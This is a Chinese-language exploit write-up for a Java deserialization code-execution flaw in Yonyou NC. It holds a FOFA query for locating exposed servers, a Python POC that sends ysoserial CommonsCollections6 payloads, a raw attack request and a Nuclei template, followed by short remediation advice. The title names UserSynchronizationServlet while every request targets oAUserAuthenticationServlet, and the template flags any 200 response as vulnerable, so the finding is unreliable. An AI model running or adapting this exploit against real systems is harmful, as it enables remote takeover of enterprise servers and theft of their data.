# 用友NC UserSynchronizationServlet 反序列化代码执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 用友NC UserSynchronizationServlet 反序列化代码执行漏洞 |
| 漏洞类型 | 反序列化 RCE |
| 影响组件 | 用友NC |
| 影响版本 | 通用版本 |

## 漏洞概述

用友NC的UserSynchronizationServlet组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的ObjectInputStream）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当UserSynchronizationServlet反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上执行任意代码，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

## fofa查询语句

```
app="用友-UFIDA-NC"
```

## 漏洞复现

### POC

```python
#!/usr/bin/env python3
"""
用友NC UserSynchronizationServlet 反序列化RCE漏洞
POC - 检查漏洞是否存在
"""
import requests
import sys
import urllib3
urllib3.disable_warnings()

# 简化版payload (实际使用需完整的ysoserial生成的序列化数据)
def generate_payload(command):
    """生成反序列化payload"""
    # 这里需要使用ysoserial工具生成完整的序列化payload
    # 示例命令: java -jar ysoserial.jar CommonsCollections6 "command" > payload.ser
    # 读取生成的payload文件
    return None

def check_vulnerability(target_url, payload_file=None):
    """检查目标是否存在反序列化漏洞"""
    target = target_url.rstrip('/') + "/servlet/oAUserAuthenticationServlet?pageId=login"
    
    headers = {
        "Content-Type": "application/x-java-serialized-object",
        "X-Authorization": "echo test"
    }
    
    try:
        if payload_file:
            # 使用ysoserial生成的payload文件
            with open(payload_file, 'rb') as f:
                data = f.read()
        else:
            # 演示payload (需要替换为真实的ysoserial payload)
            print("[!] 请使用ysoserial生成payload:")
            print("    java -jar ysoserial.jar CommonsCollections6 'whoami' > payload.ser")
            print("    python poc.py <target_url> payload.ser")
            return False
        
        response = requests.post(target, headers=headers, data=data, timeout=30, verify=False)
        
        print(f"[+] 请求已发送: {target}")
        print(f"[*] 响应状态: {response.status_code}")
        print(f"[*] 响应内容:\n{response.text[:500]}")
        
        return True
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc.py <target_url> [payload_file]")
        print("Example: python poc.py http://192.168.1.1:8080")
        print("Example: python poc.py http://192.168.1.1:8080 payload.ser")
        sys.exit(1)
    
    target_url = sys.argv[1]
    payload_file = sys.argv[2] if len(sys.argv) > 2 else None
    check_vulnerability(target_url, payload_file)
```

### 漏洞特征

- 路径：`/servlet/oAUserAuthenticationServlet?pageId=login`
- Content-Type：`application/x-java-serialized-object`
- 攻击方式：Java反序列化（Apache Commons Collections Gadget）

### 原始请求包

```
POST /servlet/oAUserAuthenticationServlet?pageId=login HTTP/1.1
Host: target
Content-Type: application/x-java-serialized-object
X-Authorization: echo dpwtsnabnsvqkmqaqapvyfetshawfuht
Content-Length: 10239

[序列化Java对象数据]
```

### Nuclei 检测模板

```yaml
id: yongyou-nc-usersync-servlet-rce

info:
  name: 用友NC UserSynchronizationServlet 反序列化RCE
  author: 吾要学习
  severity: critical
  description: 用友NC存在反序列化代码执行漏洞

requests:
  - method: POST
    path:
      - "{{BaseURL}}/servlet/oAUserAuthenticationServlet?pageId=login"
    headers:
      Content-Type: "application/x-java-serialized-object"
    matchers:
      - type: status
        status:
          - 200
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加 Web 应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
